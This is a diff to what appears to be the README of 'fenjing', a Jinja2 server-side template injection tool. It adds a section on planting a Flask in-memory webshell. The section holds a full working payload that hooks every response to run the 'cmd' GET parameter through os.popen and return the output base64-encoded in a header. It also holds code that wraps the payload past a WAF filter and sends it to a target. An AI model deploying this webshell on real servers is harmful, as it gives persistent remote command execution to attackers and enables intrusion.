@@ -75,6 +75,55 @@ print(s[::-1], end = "") # 将payload反转
 
 ## 作为库使用
 
+### 打内存马
+
+这里以Flask内存马为例
+
+```python
+import fenjing
+import requests
+
+# 这个内存马会获取GET参数cmd并执行，然后在header Aaa中返回
+payload = """
+[
+    app.view_functions
+    for app in [ __import__('sys').modules["__main__"].app ]
+    for c4tchm3 in [
+        lambda resp: [
+            resp
+            for cmd_result in [__import__('os').popen(__import__('__main__').app.jinja_env.globals["request"].args.get("cmd", "id")).read()]
+            if [
+                resp.headers.__setitem__("Aaa", __import__("base64").b64encode(cmd_result.encode()).decode()),
+                print(resp.headers["Aaa"])
+            ]
+        ][0]
+    ]
+    if [
+        app.__dict__.update({'_got_first_request':False}),
+        app.after_request_funcs.setdefault(None, []).append(c4tchm3)
+    ]
+]
+"""
+
+def waf(s):
+    return "/" not in s
+
+
+full_payload_gen = fenjing.FullPayloadGen(waf)
+payload, will_print = full_payload_gen.generate(fenjing.const.EVAL, (fenjing.const.STRING, payload))
+if not will_print:
+    print("这个payload不会产生回显")
+print(payload)
+
+# 生成payload后在这里打上去
+r = requests.get("http://127.0.0.1:5000/", params = {
+    "name": payload
+})
+
+print(r.text)
+# 然后使用`?cmd=whoami`就可以在header里看到命令执行结果了
+```
+
 ### 根据WAF函数生成shell指令对应的payload
 
 ```python
